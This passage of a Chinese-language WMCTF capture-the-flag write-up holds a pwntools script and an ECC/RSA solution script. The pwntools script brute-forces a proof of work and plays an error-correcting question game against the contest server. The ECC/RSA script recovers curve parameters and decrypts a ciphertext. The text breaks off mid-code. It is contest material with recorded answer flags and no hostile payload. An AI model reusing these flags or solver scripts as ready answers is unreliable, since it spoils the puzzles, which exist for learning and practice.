1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0)&#x27;</span>]</span><br><span class="line">questions = [i.replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; )&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> questions]</span><br><span class="line">dic = [<span class="string">&#x27;0000000000000&#x27;</span>, <span class="string">&#x27;0000011010001&#x27;</span>, <span class="string">&#x27;0000101110011&#x27;</span>, <span class="string">&#x27;0000110100010&#x27;</span>, <span class="string">&#x27;0001000110111&#x27;</span>, <span class="string">&#x27;0001011100110&#x27;</span>, <span class="string">&#x27;0001101000100&#x27;</span>, <span class="string">&#x27;0001110010101&#x27;</span>, <span class="string">&#x27;0010001101110&#x27;</span>, <span class="string">&#x27;0010010111111&#x27;</span>, <span class="string">&#x27;0010100011101&#x27;</span>, <span class="string">&#x27;0010111001100&#x27;</span>, <span class="string">&#x27;0011001011001&#x27;</span>, <span class="string">&#x27;0011010001000&#x27;</span>, <span class="string">&#x27;0011100101010&#x27;</span>, <span class="string">&#x27;0011111111011&#x27;</span>, <span class="string">&#x27;0100000001101&#x27;</span>, <span class="string">&#x27;0100011011100&#x27;</span>, <span class="string">&#x27;0100101111110&#x27;</span>, <span class="string">&#x27;0100110101111&#x27;</span>, <span class="string">&#x27;0101000111010&#x27;</span>, <span class="string">&#x27;0101011101011&#x27;</span>, <span class="string">&#x27;0101101001001&#x27;</span>, <span class="string">&#x27;0101110011000&#x27;</span>, <span class="string">&#x27;0110001100011&#x27;</span>, <span class="string">&#x27;0110010110010&#x27;</span>, <span class="string">&#x27;0110100010000&#x27;</span>, <span class="string">&#x27;0110111000001&#x27;</span>, <span class="string">&#x27;0111001010100&#x27;</span>, <span class="string">&#x27;0111010000101&#x27;</span>, <span class="string">&#x27;0111100100111&#x27;</span>, <span class="string">&#x27;0111111110110&#x27;</span>, <span class="string">&#x27;1000000011010&#x27;</span>, <span class="string">&#x27;1000011001011&#x27;</span>, <span class="string">&#x27;1000101101001&#x27;</span>, <span class="string">&#x27;1000110111000&#x27;</span>, <span class="string">&#x27;1001000101101&#x27;</span>, <span class="string">&#x27;1001011111100&#x27;</span>, <span class="string">&#x27;1001101011110&#x27;</span>, <span class="string">&#x27;1001110001111&#x27;</span>, <span class="string">&#x27;1010001110100&#x27;</span>, <span class="string">&#x27;1010010100101&#x27;</span>, <span class="string">&#x27;1010100000111&#x27;</span>, <span class="string">&#x27;1010111010110&#x27;</span>, <span class="string">&#x27;1011001000011&#x27;</span>, <span class="string">&#x27;1011010010010&#x27;</span>, <span class="string">&#x27;1011100110000&#x27;</span>, <span class="string">&#x27;1011111100001&#x27;</span>, <span class="string">&#x27;1100000010111&#x27;</span>, <span class="string">&#x27;1100011000110&#x27;</span>, <span class="string">&#x27;1100101100100&#x27;</span>, <span class="string">&#x27;1100110110101&#x27;</span>, <span class="string">&#x27;1101000100000&#x27;</span>, <span class="string">&#x27;1101011110001&#x27;</span>, <span class="string">&#x27;1101101010011&#x27;</span>, <span class="string">&#x27;1101110000010&#x27;</span>, <span class="string">&#x27;1110001111001&#x27;</span>, <span class="string">&#x27;1110010101000&#x27;</span>, <span class="string">&#x27;1110100001010&#x27;</span>, <span class="string">&#x27;1110111011011&#x27;</span>, <span class="string">&#x27;1111001001110&#x27;</span>, <span class="string">&#x27;1111010011111&#x27;</span>, <span class="string">&#x27;1111100111101&#x27;</span>, <span class="string">&#x27;1111111101100&#x27;</span>]</span><br><span class="line"><span class="comment"># 1.13.154.182:31888</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">&#x27;1.13.154.182&#x27;</span>, <span class="number">31888</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># proof of work</span></span><br><span class="line">        proof = r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(proof)</span><br><span class="line">        tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">        <span class="built_in">print</span>(tail)</span><br><span class="line">        <span class="built_in">print</span>(_<span class="built_in">hash</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;开始爆破！&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                r.sendline(head.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;爆破成功！结果是：&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(head)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">                <span class="comment"># r.recvuntil(&quot;Question: &quot;)</span></span><br><span class="line">                <span class="comment"># r.send(questions[j])</span></span><br><span class="line">                r.sendlineafter(<span class="string">&quot;Question: &quot;</span>, questions[j])</span><br><span class="line">                r.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;True&#x27;</span> <span class="keyword">in</span> r.recvuntil(<span class="string">&quot;!&quot;</span>):</span><br><span class="line">                    msg += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    msg += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):  <span class="comment"># 32*2 = 64</span></span><br><span class="line">                <span class="keyword">if</span> (dif(msg, dic[j]) &lt;= <span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            ans = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic[j][:<span class="number">6</span>]:</span><br><span class="line">                ans += k + <span class="string">&quot; &quot;</span></span><br><span class="line">            r.sendlineafter(<span class="string">&quot;chests:&quot;</span>, ans)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># WMCTF&#123;7ErrAr14_Is_a_lAND_0F_AdVeNTURe!!!!!&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>WMCTF{7ErrAr14_Is_a_lAND_0F_AdVeNTURe!!!!!}</p></blockquote><h3 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag bits: <span class="number">606</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">61262574892917665379101848600282751252633178779864648655116434051615964747592676204833262666589440081296571836666022795166255640192795587508845265816642144669301520989571990670507103278098950563219296310830719975959589061794360407053224254135937766317251283933110936269282950512402428088733821277056712795259</span></span><br><span class="line">c = <span class="number">16002162436420434728223131316901476099110904029045408221515087977802746863468505266500673611412375885221860212238712311981079623398373906773247773552766200431323537510699147642358473715224124662007742017000810447999989426207919068340364725395075614636875116086496704959130761547095168937180751237132642548997</span></span><br><span class="line">G = (<span class="number">3364552845709696244757995625685399274809023621531082895612949981433844727622567352338990765970534554565693355095508508160162961299445890209860508127449468</span> : <span class="number">4874111773041360858453223185020051270111929505293131058858547656851279111764112235653823943997681930204977283843433850957234770591933663960666437259499093</span> : <span class="number">1</span>)</span><br><span class="line">3G = (<span class="number">8240596254289477251157504980772167439041663401504657696787046343848644902166655624353107697436635678388969190302189718026343959470011854412337179727187240</span> : <span class="number">4413479999185843948404442728411950785256136111461847698098967018173326770728464491960875264034301169184074110521039566669441716138955932362724194843596479</span> : <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>hint：wmctf{a+b+c}</strong></p><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>factordb分解出n，根据提示将a、b、m二进制补位并拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum,gmpy2</span><br><span class="line"><span class="comment"># flag bits: 606</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">61262574892917665379101848600282751252633178779864648655116434051615964747592676204833262666589440081296571836666022795166255640192795587508845265816642144669301520989571990670507103278098950563219296310830719975959589061794360407053224254135937766317251283933110936269282950512402428088733821277056712795259</span></span><br><span class="line">c = <span class="number">16002162436420434728223131316901476099110904029045408221515087977802746863468505266500673611412375885221860212238712311981079623398373906773247773552766200431323537510699147642358473715224124662007742017000810447999989426207919068340364725395075614636875116086496704959130761547095168937180751237132642548997</span></span><br><span class="line">x1, y1 = (<span class="number">3364552845709696244757995625685399274809023621531082895612949981433844727622567352338990765970534554565693355095508508160162961299445890209860508127449468</span> , <span class="number">4874111773041360858453223185020051270111929505293131058858547656851279111764112235653823943997681930204977283843433850957234770591933663960666437259499093</span>)</span><br><span class="line">x3, y3 = (<span class="number">8240596254289477251157504980772167439041663401504657696787046343848644902166655624353107697436635678388969190302189718026343959470011854412337179727187240</span> , <span class="number">4413479999185843948404442728411950785256136111461847698098967018173326770728464491960875264034301169184074110521039566669441716138955932362724194843596479</span>)</span><br><span class="line">tmp1 = x1^<span class="number">3</span>-y1^<span class="number">2</span></span><br><span class="line">tmp2 = x3^<span class="number">3</span>-y3^<span class="number">2</span></span><br><span class="line">tmp = (tmp2-tmp1)</span><br><span class="line">p = <span class="number">8308060309959524788634404677678479024666400240233812713350984932475838872076486898595574202532027412806488106365658717017155800093596205985127436125626827</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp = x3^3-x1^3-y3^2+y1^2  # tmp = a(x1-x3)+kp</span></span><br><span class="line"><span class="comment"># R.&lt;a&gt; = PolynomialRing(Zmod(p))</span></span><br><span class="line"><span class="comment"># f = a*(x1-x3)-tmp</span></span><br><span class="line"><span class="comment"># print(f.roots())</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">3629864911627283784723617758993690217446918991113173559686999</span></span><br><span class="line"><span class="built_in">print</span>((tmp-a*(x1-x3))%p)  <span class="comment"># 验证a</span></span><br><span class="line">b = (y3^<span class="number">2</span>-x3^<span class="number">3</span>-a*x3)%p</span><br><span class="line">q = n//p</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"></span><br><span class="line"><span class="comment">####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span>, <span class="built_in">int</span>(a).bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">int</span>(b).bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="built_in">int</span>(flag).bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b =&#x27;</span>, b)</span><br><span class="line">tmp = <span class="built_in">str</span>(a)+<span class="built_in">str</span>(b)+<span class="built_in">str</span>(flag)</span><br><span class="line"><span class="comment"># tmp = a+b+flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;0&#x27;</span>*(<span class="number">202</span>-<span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(num)[<span class="number">2</span>:])))+<span class="built_in">str</span>(<span class="built_in">bin</span>(num)[<span class="number">2</span>:])))</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;0&#x27;</span>*(<span class="number">202</span>-<span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(num)[<span class="number">2</span>:])))+<span class="built_in">str</span>(<span class="built_in">bin</span>(num)[<span class="number">2</span>:]))</span><br><span class="line">flag = <span class="built_in">int</span>(pad(a)+pad(b)+pad(flag),<span 